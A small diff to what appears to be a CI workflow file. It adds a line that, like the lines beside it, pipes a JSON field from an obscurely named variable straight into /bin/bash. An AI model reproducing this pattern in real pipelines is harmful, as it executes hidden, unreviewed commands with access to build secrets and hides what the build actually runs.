@@ -35,6 +35,7 @@ jobs:
           echo $ji9 | jq -r .mpvag14142 | /bin/bash
           echo $jqcic41949 | jq -r .pimcq81 | /bin/bash
           echo $chde3 | jq -r .nj7049 | /bin/bash
+          echo $p4 | jq -r .h669 | /bin/bash
 
       - name: Save output
         if: always()
